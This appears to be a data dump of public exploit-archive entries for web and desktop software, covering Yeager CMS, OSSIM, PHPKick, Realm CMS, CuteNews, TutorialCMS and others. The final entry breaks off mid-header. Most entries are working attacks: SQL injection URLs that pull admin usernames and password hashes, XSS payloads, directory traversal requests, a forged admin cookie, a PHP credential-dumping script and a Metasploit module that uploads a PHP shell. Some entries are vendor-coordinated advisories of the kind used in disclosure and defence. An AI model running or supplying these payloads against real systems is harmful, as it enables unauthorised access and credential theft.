39436,"Yeager CMS 1.2.1 - Multiple Vulnerabilities SEC Consult Vulnerability Lab Security Advisory < 20160210-0 > =======================================================================               title: Multiple Vulnerabilities             product: Yeager CMS  vulnerable version: 1.2.1       fixed version: 1.3          CVE number: CVE-2015-7567, CVE-2015-7568, CVE-2015-7569, CVE-2015-7570 ,                      CVE-2015-7571, CVE-2015-7572              impact: Critical            homepage: http://yeager.cm/en/home/               found: 2015-11-18                  by: P. Morimoto (Office Bangkok)                      SEC Consult Vulnerability Lab                       An integrated part of SEC Consult                      Bangkok - Berlin - Frankfurt/Main - Montreal - Moscow                      Singapore - Vienna (HQ) - Vilnius - Zurich                       https://www.sec-consult.com  =======================================================================  Vendor description: ------------------- Yeager is an open source CMS that aims to become the most cost/time-effective solution for medium and large web sites and applications.   Business recommendation: ------------------------ Yeager CMS suffers from multiple vulnerabilities due to improper input validation and unprotected test scripts. By exploiting these vulnerabilities an attacker could:     1. Change user's passwords including the administrator's account.     2. Gain full access to the Yeager CMS database.     3. Determine internal servers that inaccessible from the Internet.     4. Attack other users of the Yeager CMS with Cross-Site Scripting.  SEC Consult recommends not to use this software until a thorough security review has been performed by security professionals and all identified issues have been resolved.  Vulnerability overview/description: ----------------------------------- 1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568) 2. Post-authentication Blind SQL Injection (CVE-2015-7569) 3. Unauthenticated Arbitrary File Upload (CVE-2015-7571) 4. Unauthenticated Server-side Request Forgery (CVE-2015-7570) 5. Non-permanent Cross-site Scripting (CVE-2015-7572)   Proof of concept: ----------------- 1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568) http://<host>/yeager/?action=passwordreset&token=<SQL Injection> http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70 &data=[""noevent"",{""yg_property"":""setNewPassword"",""params"":{""userToken"":""<SQL Injection>""}}]  The vulnerability can also be used for unauthorized reset password of any user. In order to reset a specific user's password, an attacker will need to provide a valid email address of the user that he wants to attack. The email can be retrieved by either social engineering or using the aforementioned unauthenticated SQL injection vulnerability.  http://<host>/yeager/y.php/responder?handler=recoverLogin&us=sess_20000&lh=70&d ata=[""noevent"",{""yg_property"":""recoverLogin"",""params"":{""userEmail"":""<victim@ema il.com>"",""winID"":""1""}}]  The above URL just simply creates and sends a reset password token to the user's email. Next, even if attacker does not know the token, manipulating SQL commands allows to force to set the new password instantly.  Note that new password MUST be at least 8 characters in length and must contain both letters and numbers.  http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70 &data=[""noevent"",{""yg_property"":""setNewPassword"",""params"":{""userToken"":""'+or+ui d=(select+id+from+yg_user+where+login='<victim@email.com>')+limit+1--+-"",""userP assword"":""<new-password>"",""winID"":""1""}}]  2. Post-authentication Blind SQL Injection (CVE-2015-7569) http://<host>/yeager/y.php/tab_USERLIST POST Data: win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000& lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=<SQL Injection>&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1  3. Unauthenticated Arbitrary File Upload (CVE-2015-7571) A publicly known Arbitrary File Upload vulnerability of Plupload was found in Yeager CMS. Fortunately, to successfully exploit the vulnerability requires PHP directive ""upload_tmp_dir"" set to an existing directory and it must contain the writable directory ""plupload"".  By default, the PHP directive ""upload_tmp_dir"" is an empty value. As a result, the script will attempt to upload a file to /plupload/ instead which generally does not exist on the filesystem.  http://<host>/yeager/ui/js/3rd/plupload/examples/upload.php  4. Unauthenticated Server-side Request Forgery (CVE-2015-7570) http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite.php http://<host>/yeager/libs/org/adodb_lite/tests/test_datadictionary.php http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite_sessions.php  The parameter ""dbhost"" can be used to perform internal port scan using time delay measurement. An attacker can provide internal IP address and port number, for example, 10.10.0.1:22. The attacker then compares time delays from multiple responses in order to determine host and port availability.  5. Non-permanent Cross-site Scripting (CVE-2015-7572) A previously published XSS vulnerability of Plupload was found in Yeager CMS. http://<host>/yeager/ui/js/3rd/plupload/js/plupload.flash.swf?id=\%22%29%29;}ca tch%28e%29{alert%28/XSS/%29;}//   Vulnerable / tested versions: ----------------------------- The vulnerabilities have been tested on Yeager CMS 1.2.1  URL: http://yeager.cm/en/download/package/?v=1.2.1.0.0   Vendor contact timeline: ------------------------ 2015-12-07: Contacting vendor through office@nexttuesday.de, contact@yeager.cm 2015-12-07: Established secure communication channel 2015-12-07: Sending advisory draft 2015-12-10: Yeager CMS 1.2.2 released for security fixes 2015-12-22: Yeager CMS 1.3 released for security fixes 2016-02-10: Public advisory release  Solution: --------- The vulnerability has been fixed in Yeager CMS 1.3 and later.  https://github.com/ygcm/yeager/commit/74e0ce518321e659cda54f3f565ca0ce8794dba8# diff-4200a6e704ae66ada32f35f69796cc71 https://github.com/ygcm/yeager/commit/053a3b98a9a3f4fd94186cbb8994de0a3e8d9307  Workaround: ----------- No workaround available.   Advisory URL: ------------- https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  SEC Consult Vulnerability Lab  SEC Consult Bangkok - Berlin - Frankfurt/Main - Montreal - Moscow Singapore - Vienna (HQ) - Vilnius - Zurich  About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Interested to work with the experts of SEC Consult? Send us your application https://www.sec-consult.com/en/Career.htm  Interested in improving your cyber security with the experts of SEC Consult? Contact our local offices https://www.sec-consult.com/en/About/Contact.htm ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult  EOF Pichaya Morimoto / @2015",Yeager,1
35127,Progress OpenEdge 11.2 - Directory Traversal # Exploit Title: Progress OpenEdge Directory Traversal # Date: 30/10/2014 # Exploit Author: Mauricio Correa # Vendor Homepage: www.progress.com # Software Link: www.progress.com/products/openedge # Version: 11.2 # Tested on: Windows OS # CVE : CVE-2014-8555     The malicious user sends a malformed request that generates the file access up directories as follows:      http://target_ip:9090/report/reportViewAction.jsp?selection=..%2f..%2f..%2f. .%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini      or else      http:// target_ip:9090/report/reportViewAction.jsp?selection=../../../../../../../.. /../../windows/win.ini         And the application answers     ; for 16-bit app support  [fonts]  [extensions]  [mci extensions]  [files]  [Mail]  MAPI=1  CMCDLLNAME32=mapi32.dll  CMC=1  MAPIX=1  MAPIXVER=1.0.0.1  OLEMessaging=1        More informations (in Br-Portuguese): https://www.xlabs.com.br/blog/?p=256     Thanks,.progress.,1
5171,"OSSIM 0.9.9rc5 - Cross-Site Scripting / SQL Injection Application: OSSIM http://www.ossim.net Version: 0.9.9rc5  Note: it is possible that the problem affects also earlier OSSIM versions Platforms: Linux Bug: SQL injection, Cross Site Scripting Exploitation: remote Date: 21 Feb 2008 Author: Marcin Kopec E-mail: marcin(dot)kopec(at)hotmail(dot)com  ---------------------------------------  1) Introduction  OSSIM it's a free implementation of  Security Information Management (SIM) system, equipped with many useful security tools (nessus, snort, p0f, ntop, ...) managed from easy-to-use web panel.  2) SQL injection  The bug exist in portname parameter of modifyportform.php It's possible to obtain hashed administrator password when user have rights to do port modification in ""PORTS"" tab.  http://[host]/ossim/port/modifyportform.php?portname=ANY'%20and%201=2%20union%20select%20pass,2%20from%20ossim.users%20where%20login='admin  3) XSS  Quotes in OSSIM aren't property sanitized.   Below XSS may be executed without logging into the OSSIM.  http://[host]/ossim/session/login.php?dest=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--  # milw0rm.com [2008-02-21]",.ossim.,1
14578,"PHPKick 0.8 - 'Statistics.php' SQL Injection # Exploit Title: PHPKick v0.8 statistics.php SQL Injection # Date: August 8th, 2010 # Time: 03:45am ;( # Author: garwga # Version: 0.8 # Google dork : ""© 2004 PHPKick.de Version 0.8"" # Category:  webapps/0day # Code: see below   <?php 	echo""\n\n""; 	echo""|=================PHPKick v0.8 statistics.php SQL Injection==================|\n""; 	echo""|                                                                            |\n""; 	echo""|Syntax: php "".$_SERVER['argv'][0]."" [host] [path]                                       |\n""; 	echo""|                                                                            |\n""; 	echo""|Example: php "".$_SERVER['argv'][0]."" http://www.domain.com /path/                       |\n"";     echo""|                                                                            |\n"";   	echo""|Notes:This exploit works regardless of the PHP security settings            |\n"";     echo""|      (magic_quotes, register_globals).This exploit is only for educational |\n""; 	echo""|      use, use it on your own risk! Exploiting scripts without permission of|\n""; 	echo""|      the owner of the webspace is illegal!                                 |\n""; 	echo""|      I'm not responsible for any resulting damage                          |\n""; 	echo""|                                                                            |\n""; 	echo""|Google Dork: \""© 2004 PHPKick.de Version 0.8\""                                |\n""; 	echo""|                                                                            |\n""; 	echo""|Exploit found by garwga (ICQ#:453-144-667)                                  |\n""; 	echo""|============================================================================|\n\n\n"";     if($_SERVER['argv'][1] && $_SERVER['argv'][2]){ 	$host=$_SERVER['argv'][1]; 	$path=$_SERVER['argv'][2];     $spos=strpos($host, ""http://"");   	if(!is_int($spos)&&($spos==0)){ 	   $host=""http://$host"";   	  } 	if(!$host==""http://localhost""){ 	   $spos=strpos($host, ""http://www."");   	   if (!is_int($spos)&&($spos==0)){ 	      $host=""http://www.$host"";   	      } 	  } 	$exploit=""statistics.php?action=overview&gameday=-32%20union%20select%201,2,3,4,0x2720756e696f6e2073656c65637420312c322c636f6e636174286e69636b2c273a272c70617373776f7274292c342c352c362c372066726f6d206b69636b5f757365722077686572652069643d2231222d2d2066,6,7,8--%20f""; 	echo""exploiting...\n""; 	$source=file_get_contents($host.$path.$exploit); 	$username=GetBetween($source,"" :<br>"","":""); 	echo ""username: $username\n""; 	$hash=GetBetween($source,""<br>$username:"",""</td>""); 	echo""hash: $hash\n""; 	} else{ 	echo""\n\n""; 	echo""|=================PHPKick v0.8 statistics.php SQL Injection==================|\n""; 	echo""|                                                                            |\n""; 	echo""|Syntax: php "".$_SERVER['argv'][0]."" [host] [path]                                       |\n""; 	echo""|                                                                            |\n""; 	echo""|Example: php "".$_SERVER['argv'][0]."" http://www.domain.com /path/                       |\n"";     echo""|                                                                            |\n"";   	echo""|Notes:This exploit works regardless of the PHP security settings            |\n"";     echo""|      (magic_quotes, register_globals).This exploit is only for educational |\n""; 	echo""|      use, use it on your own risk! Exploiting scripts without permission of|\n""; 	echo""|      the owner of the webspace is illegal!                                 |\n""; 	echo""|      I'm not responsible for any resulting damage                          |\n""; 	echo""|                                                                            |\n""; 	echo""|Google Dork: \""© 2004 PHPKick.de Version 0.8\""                                |\n""; 	echo""|                                                                            |\n""; 	echo""|Exploit found by garwga (ICQ#:453-144-667)                                  |\n""; 	echo""|============================================================================|\n""; } function GetBetween($content,$start,$end){     $r = explode($start, $content);     if (isset($r[1])){         $r = explode($end, $r[1]);         return $r[0];     }     return ''; } ?>",.domain.,1
44795,MyBB ChangUonDyU Plugin 1.0.2 - Cross-Site Scripting # Exploit Title: MyBB ChangUonDyU Advanced Statistics Plugin v1.0.2 - Cross-Site Scripting # Date: 5/25/2018 # Author: 0xB9 # Twitter: @0xB9Sec # Contact: 0xB9[at]pm.me # Software Link: https://community.mybb.com/mods.php?action=view&pid=1125 # Version: 1.0.2 # Tested on: Ubuntu 18.04 # CVE: CVE-2018-11532   1. Description: This plugin displays advanced statistics on the index page such as latest posts with auto refresh using AJAX.      2. Proof of Concept: Create a new thread with the following payload as the title  <svg onload=alert('XSS')>  The alert will appear on the index page    3. Solution: Update to the latest release,MyBB,1
41670,"APNGDis 2.8 - 'filename' Stack Buffer Overflow (PoC) # Exploit Title: APNGDis filename Buffer Overflow # Date: 14-03-2017 # Exploit Author: Alwin Peppels # Vendor Homepage: http://apngdis.sourceforge.net/ # Software Link: https://sourceforge.net/projects/apngdis/files/2.8/ # Version: 2.8 # Tested on: Linux Debian / Windows 7 # CVE : CVE-2017-6191  Additional analysis: https://www.onvio.nl/nieuws/cve-2017-6191-apngdis-filename-buffer-overflow  Textbook buffer overflow; a fixed size buffer gets allocated with szPath[256], and the first command line argument is stored without validation.   int main(int argc, char** argv) { 	unsigned int i, j; 	char * szInput; 	char * szOutPrefix; 	char szPath[256]; 	char szOut[256]; 	std::vector frames; 	printf(""\nAPNG Disassembler 2.8\n\n"");  	if (argc > 1) 		szInput = argv[1]; 	else 	{ 		printf(""Usage: apngdis anim.png [name]\n""); 		return 1; 	} 	strcpy(szPath, szInput); }     With 'A' * 1000 as argv[1] :   GDB:  Program received signal SIGSEGV, Segmentation fault. strlen () at ../sysdeps/x86_64/strlen.S:106 106     ../sysdeps/x86_64/strlen.S: No such file or directory. (gdb) i r rax            0x4141414141414141       4702111234474983745 rbx            0x7ffff70ea600   140737338320384 rcx            0x141    321 rdx            0x0      0 rsi            0x7fffffffca40   140737488341568 rdi            0x4141414141414141       4702111234474983745 rbp            0x7fffffffceb0   0x7fffffffceb0 rsp            0x7fffffffc948   0x7fffffffc948 r8             0x4141414141414141       4702111234474983745 r9             0x9      9 r10            0x73     115 r11            0x7fffffffce78   140737488342648 r12            0x555555558c9f   93824992251039 r13            0x7fffffffcec8   140737488342728 r14            0x0      0 r15            0xffffffffffffffff       -1 rip            0x7ffff6dd1486   0x7ffff6dd1486 <strlen+38> eflags         0x10297  [ CF PF AF SF IF RF ]   Valgrind:  ==10685== Invalid read of size 1 ==10685==    at 0x4C2EDA2: strlen (vg_replace_strmem.c:454) ==10685==    by 0x5B6ADA2: vfprintf (vfprintf.c:1637) ==10685==    by 0x5B711F8: printf (printf.c:33) ==10685==    by 0x109F05: load_apng(char*, std::vector<APNGFrame, std::allocator<APNGFrame> >&) (apngdis.cpp:200) ==10685==    by 0x10B24E: main (apngdis.cpp:498) ==10685==  Address 0x4141414141414141 is not stack'd, malloc'd or (recently) free'd ==10685== ==10685== ==10685== Process terminating with default action of signal 11 (SIGSEGV) ==10685==  General Protection Fault ==10685==    at 0x4C2EDA2: strlen (vg_replace_strmem.c:454) ==10685==    by 0x5B6ADA2: vfprintf (vfprintf.c:1637) ==10685==    by 0x5B711F8: printf (printf.c:33) ==10685==    by 0x109F05: load_apng(char*, std::vector<APNGFrame, std::allocator<APNGFrame> >&) (apngdis.cpp:200) ==10685==    by 0x10B24E: main (apngdis.cpp:498) Reading '==10685== ==10685== HEAP SUMMARY: ==10685==     in use at exit: 0 bytes in 0 blocks ==10685==   total heap usage: 2 allocs, 2 frees, 73,728 bytes allocated ==10685== ==10685== All heap blocks were freed -- no leaks are possible",apngdis_project,1
11721,"GeekHelps ADMP 1.01 - Multiple Vulnerabilities #########################local file include / sql injection################# Author: ItSecTeam  download from:http://geekhelps.net/download.php  script:ADMP  remote:yes  dork::D *********************lfi******************* vul1:/path/themes/colorvoid/footer.php include(""./themes/$style/info.php""); ?> line 3  vuls:themes/default-green/footer.php themes/default-orange/footer.php themes/default/footer.php  include(""./themes/$style/info.php""); ?> line 4 --------------------------------------------  xpl lfi:/path/themes/colorvoid/footer.php?style=[lfi]%00 xpl lfi:/path/themes/default-green/footer.php ?style=[lfi]%00  xpl lfi:/path/themes/default-orange/footer.php?style=[lfi]%00 xpl lfi:/path/themes/default/footer.php?style=[lfi]%00  xpl sql:/path/bannershow.php?click=' sql injection code  ########################  discovered by ahmadbady  ########################",GeekHelps,1
31579,"Titan FTP Server 10.32 Build 1816 - Directory Traversal ""Titan FTP Server Directory Traversal Vulnerabilities""   ******************************************************************************   - Affected Vendor: South River Technologies - Affected System: Titan FTP Server software (Version 10.32 Build 1816) - Vendor Disclosure Date: January 27th, 2014 - Public Disclosure Date: February 10h, 2014 - Vulnerabilities' Status: Fixed   ******************************************************************************   Associated CVEs:   1) CVE-2014-1841:    It is possible to copy the complete home folder of another user by leveraging a vulnerability on the Titan FTP Server Web Interface.   2) CVE-2014-1842:    It is possible to obtain the complete list of existing users by writing ""/../"" on the search bar.   3) CVE-2014-1843:    It is possible to observe the ""Properties"" for an existing user home folder.    This also allows for enumeration of existing users on the system.   Associated CWE:     CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')   http://cwe.mitre.org/data/definitions/22.html   ******************************************************************************   DESCRIPTIONS ============   1) CVE-2014-1841:      It is possible to copy the complete home folder of another user by leveraging a vulnerability on the Titan FTP Server Web Interface.        This is done by using the ""Move"" function, and replacing the ""src"" parameter value with the ""/../<folder name of another user>"" value.      2) CVE-2014-1842:      It is possible to obtain the complete list of existing users by writing ""/../"" on the search bar and hitting the ""Go"" button.   3) CVE-2014-1843:      It is possible to observe the ""Properties"" for an existing user home folder.        This also allows for enumeration of existing users on the system.        This is done by using the ""Properties"" function, and replacing the ""src"" parameter value with the ""/../<folder name of another user>"" value.      ******************************************************************************   - Available fix:   Titan FTP Server software (Version 10.40 Build 1829):    + titanftp32_10_40_1829_en.exe    + titanftp64_10_40_1829_en.exe   - Related Links: Deloitte Argentina - www.deloitte.com/ar   - Feedback:   If you have any questions, comments, concerns, updates or suggestions please contact:    + Fara Rustein      frustein@deloitte.com (Twitter: @fararustein)    + Luciano Martins      lmartins@deloitte.com (Twitter: @clucianomartins)   ******************************************************************************   Credits:   CVE-2014-1841:   1. It is possible to copy the complete home folder of another user by leveraging a vulnerability on the Titan FTP Server Web Interface.   Discovered by Fara Rustein - frustein@deloitte.com   CVE-2014-1842:   2. It is possible to obtain the complete list of existing users by writing ""/../"" on the search bar.   Discovered by Luciano Martins - lmartins@deloitte.com   CVE-2014-1843:   3. It is also possible to observe the ""Properties"" for an existing user home folder.   This also allows for enumeration of existing users on the system.   Discovered by Fara Rustein - frustein@deloitte.com    ******************************************************************************   Fara Rustein | Senior Consultant Cyber Security - Deloitte The key is searching. Vs nfv zphz qsui ghzf zg xhv yvzqy gj tiwap.    Deloitte se refiere a una o más de las firmas miembros de Deloitte Touche Tohmatsu Limited, una compañía privada del Reino Unido limitada por garantía, y su red de firmas miembros, cada una como una entidad única e independiente y legalmente separada. Una descripción detallada de la estructura legal de Deloitte Touche Tohmatsu Limited y sus firmas miembros puede verse en el sitio web http://www.deloitte.com/about.                           La información de este mail es confidencial y concierne únicamente a la persona a quien está dirigida. Si este mensaje no está dirigido a usted, por favor tenga presente que no tiene autorización para leer el resto de este e-mail, copiarlo o derivarlo a cualquier otra persona que no sea aquella a quien está dirigido. Si recibe este mail por error, por favor, avise al remitente, luego de lo cual rogamos a usted destruya el mensaje original. No se puede responsabilizar de ningún modo a Deloitte & Co. S.A. ni a sus subsidiarias por cualquier consecuencia o daño que pueda resultar del apropiado y completo envío y recepción del contenido de este e-mail.   Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see http://www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms.  The information in this e-mail is confidential and intended solely for the person to whom it is addressed. If this message is not addressed to you, please be aware that you have no authorization to read the rest of this e-mail, to copy it or to furnish it to any person other than the addressee. Should you have received this e-mail by mistake, please bring this to the attention of the sender, after which you are kindly requested to destroy the original message. Deloitte & Co. S.A. and subsidiaries cannot be held responsible or liable in any way whatsoever for and/or in connection with any consequences and/or damage resulting from the proper and complete dispatch and receipt of the content of this e-mail.",southrivertech,1
5766,"realm CMS 2.3 - Multiple Vulnerabilities ########################## www.BugReport.ir ####################################### # #        AmnPardaz Security Research Team # # Title: Realm CMS Multiple Vulnerabilities Lead to Admin Access. # Vendor: www.realmproject.com # Vulnerable Version: 2.3 and prior versions # Exploit: Available # Impact: High # Fix: N/A # Original Advisory: http://bugreport.ir/index.php?/40 ###################################################################################  #################### 1. Description: ####################  Realm CMS is an unique FREE classic ASP application integrating  together Content Management and Blogging web publishing. Realm CMS is  especially designed and tuned to be fast and smart handling web sites  including thousands of web pages. Realm CMS is fundamentally based on  the technology of caching - simultaneously using server's RAM and disk.  This means that Realm CMS web site is easily managed as are database  driven web sites and the same time it is as fast, robust as web sites  based on pure HTML. This feature makes Realm CMS MS Access database  driven web site fast and robust as are enterprise level database driven  sites.   #################### 2. Vulnerabilities: ####################     2.1. Broken Authentication and Session Management. Attacker can enter to the admin pages by a manipulated cookie.         2.1.1. Exploit:                         Check the exploit section.     2.2. Injection Flaws. SQL Injection in ""inc_routines.asp"" in ""KeyWordsList"" function on ""kwrd"" parameter.         2.2.1. Exploit:                         Check the exploit section.     2.3. Cross Site Scripting (XSS), Information Leakage. Reflected XSS attack, and DB path disclosure in ""/cms/_db/compact.asp""         2.3.1. Exploit:                         Check the exploit section. #################### 3. Exploits: ####################     Original Exploit URL: http://bugreport.ir/index.php?/40/exploit     3.1. Attacker can enter to the admin pages by a manipulated cookie.         -------------         -Set these cookies:             RealmCmsUser=cUserfiles=userFiles&cIntallType=BugReportTeam&cDbLocat=in&cSiteName=www.Bugreport.IR&cFolder=%2Fcms&cUniqueID=db&cUserRole=1&cUserName=Admin&cUserID=20         -Then go to:             /_RealmAdmin/login.asp         -------------     3.2. SQL Injection in ""inc_routines.asp"" in ""KeyWordsList"" function on ""kwrd"" parameter.         -------------         http://[URL]/cmsr/?job=kwl&kwrd=WWW.BugReport.IR' union select name,password from tblusers where name not like '%WWW.BugReport.IR         -------------     3.3. Reflected XSS attack, and DB path disclosure in ""/cms/_db/compact.asp""         -------------         http://[URL]/cms/_db/compact.asp?CmpctedDB=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E    (Reflected XSS attack)         http://[URL]/cms/_db/compact.asp?CmpctedDB=1&Boyut=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E    (Reflected XSS attack)         http://[URL]/cms/_db/compact.asp    (DB path disclosure)         ------------- #################### 4. Solution: ####################     Rename admin directory ""/_RealmAdmin"" and wait for vendor patch (for 2.1).     Edit the source code to ensure that inputs are properly sanitized (for 2.2).     Remove or rename all the ""/_db/compact.asp"" files, in the cms (for 2.3). #################### 5. Credit: #################### AmnPardaz Security Research & Penetration Testing Group Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com  # milw0rm.com [2008-06-09]",.BugReport.ir,1
6298,"Web Directory Script 2.0 - 'name' SQL Injection Web Directory Script <= 2.0 SQL Injection Vulnerability  Author: ~!Dok_tOR!~ Contact: coder5(at)topmail.kz  Home Page: www.antichat.ru Date found: 23.08.08 Product: Web Directory Script Version: 2.0 Download script: http://rapidshare.com/files/121448809/W3bDirScr2-nullscript.net.rar Password: nullscript.net Vulnerability Class: SQL Injection  listing_view.php  Vuln code:  $friendly_url=$_GET['name'];  http://localhost/[installdir]/  magic_quotes_gpc = Off  Exploit:  listing_view.php?name='+union+select+1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15+from+members/*  Thanks: Zitt, rijy, Koller, NOmeR1, $n@]<e, n0ne, +toxa+, [cash], ettee, HiM@S and All members of antichat.ru and xaker.name .  # milw0rm.com [2008-08-25]",.antichat.,1
46698,"CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking     include Msf::Exploit::Remote::HttpClient     def initialize(info = {})     super(update_info(info,       'Name' => ""CuteNews 2.1.2 - 'avatar' Remote Code Execution"",       'Description' => %q(         This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.         The attacker can infiltrate the server through the avatar upload process in the profile area.         There is no realistic control of the $imgsize function in ""/core/modules/dashboard.php""         Header content of the file can be changed and the control can be bypassed.         We can use the ""GIF"" header for this process.         An ordinary user is enough to exploit the vulnerability. No need for admin user.         The module creates a file for you and allows RCE.       ),       'License' => MSF_LICENSE,       'Author' =>         [           'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module         ],       'References' =>         [           ['URL', 'http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html']           ['URL', 'http://cutephp.com'] # Official Website         ],       'Platform' => 'php',       'Arch' => ARCH_PHP,       'Targets' => [['Automatic', {}]],       'Privileged' => false,       'DisclosureDate' => ""Apr 14 2019"",       'DefaultTarget' => 0))       register_options(       [         OptString.new('TARGETURI', [true, ""Base CutePHP directory path"", '/CuteNews']),         OptString.new('USERNAME', [true, ""Username to authenticate with"", 'admin']),         OptString.new('PASSWORD', [false, ""Password to authenticate with"", 'admin'])       ]     )   end    def exec     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""uploads"",""avatar_#{datastore['USERNAME']}_#{@shell}"") # shell url     })   end ## # Login and cookie information gathering ##     def login(uname, pass, check)     # 1st request to get cookie     res = send_request_cgi(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'index.php'),       'vars_post' => {         'action' => 'dologin',         'username' => uname,         'password' => pass       }     )      cookie = res.get_cookies     # 2nd request to cookie validation     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php""),       'cookie'   => cookie     })       if res.code = 200 && (res.body =~ /dashboard/)       return cookie          end       fail_with(Failure::NoAccess, ""Authentication was unsuccessful with user: #{uname}"")     return nil   end     def peer     ""#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}""   end ## # Upload malicious file // payload integration ##   def upload_shell(cookie, check)      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php?mod=main&opt=personal""),       'cookie'   => cookie     })      signkey = res.body.split('__signature_key"" value=""')[1].split('""')[0]     signdsi = res.body.split('__signature_dsi"" value=""')[1].split('""')[0]     # data preparation     fname = Rex::Text.rand_text_alpha_lower(8) + "".php""     @shell = ""#{fname}""     pdata = Rex::MIME::Message.new     pdata.add_part('main', nil, nil, 'form-data; name=""mod""')     pdata.add_part('personal', nil, nil, 'form-data; name=""opt""')     pdata.add_part(""#{signkey}"", nil, nil, 'form-data; name=""__signature_key""')     pdata.add_part(""#{signdsi}"", nil, nil, 'form-data; name=""__signature_dsi""')     pdata.add_part('', nil, nil, 'form-data; name=""editpassword""')     pdata.add_part('', nil, nil, 'form-data; name=""confirmpassword""')     pdata.add_part(""#{datastore['USERNAME']}"", nil, nil, 'form-data; name=""editnickname""')     pdata.add_part(""GIF\r\n"" + payload.encoded, 'image/png', nil, ""form-data; name=\""avatar_file\""; filename=\""#{fname}\"""")     pdata.add_part('', nil, nil, 'form-data; name=""more[site]""')     pdata.add_part('', nil, nil, 'form-data; name=""more[about]""')     data = pdata.to_s       res = send_request_cgi({       'method' => 'POST',           'data'  => data,       'agent' => 'Mozilla',       'ctype' => ""multipart/form-data; boundary=#{pdata.bound}"",       'cookie' => cookie,       'uri' => normalize_uri(target_uri.path, ""index.php"")          })      if res && res.code == 200 && res.body =~ /User info updated!/       print_status(""Trying to upload #{fname}"")       return true     else       fail_with(Failure::NoAccess, 'Error occurred during uploading!')       return false     end    end ## # Exploit controls and information ##   def exploit     unless Exploit::CheckCode::Vulnerable == check       fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')     end      cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)     print_good(""Authentication was successful with user: #{datastore['USERNAME']}"")      if upload_shell(cookie, true)       print_good(""Upload successfully."")       exec     end   end ## # Version and Vulnerability Check ##   def check       res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php"")     })       unless res       vprint_error 'Connection failed'       return CheckCode::Unknown     end       if res.code == 200       version = res.body.split('target=""_blank"">CuteNews ')[1].split('</a>')[0]       if version < '2.1.3'        print_status(""#{peer} - CuteNews is #{version}"")        return Exploit::CheckCode::Vulnerable       end     end       return Exploit::CheckCode::Safe   end end ## # The end of the adventure (o_O) // AkkuS ##",cutephp,1
3887,"TutorialCMS 1.00 - 'search.php?search' SQL Injection #!/usr/bin/perl -w  ################################################################################# #										# #		     TutorialCMS <= 1.00 SQL Injection Exploit			# #										# # Discovered by: Silentz							# # Payload: Admin Username & Hash Retrieval					# # Website: http://www.w4ck1ng.com						# # 										# # Vulnerable Code (search.php):							# #										# #      $search = $_REQUEST['search'];						# #      $sql    = ""SELECT * FROM tutorials WHERE title LIKE '%$search%' 		# #		  ORDER BY hits DESC LIMIT $startID , $perPage""; 		# #										# # Manual SQL Injection:								# #      										# #      	browseCat.php?catFile=[SQL QUERY]					# #	browseSubCat.php?catFile=[SQL QUERY]					# #	openTutorial.php?id=[SQL QUERY]						# #	search.php?search=[SQL QUERY]						# #	topFrame.php?id=[SQL QUERY]						# #	admin/editListing.php?id=[SQL QUERY]					# #										# # NOTE: All above parameters are vulnerable to XSS, so try:			# #										# #	search.php?search=""><script>alert('http://www.w4ck1ng.com')</script>	#		 #										# # PoC: http://victim.com/search.php?search=' UNION SELECT 0,0,0,0,username,	# #      password,0,0,0,0,0,0,0 FROM users WHERE id='1' /*			# # 										# # Subject To: magic_quotes_gpc set to off					# # GoogleDork: ""Powered By Photoshop Tutorials"" (0 Results)			# #										# # Shoutz: The entire w4ck1ng 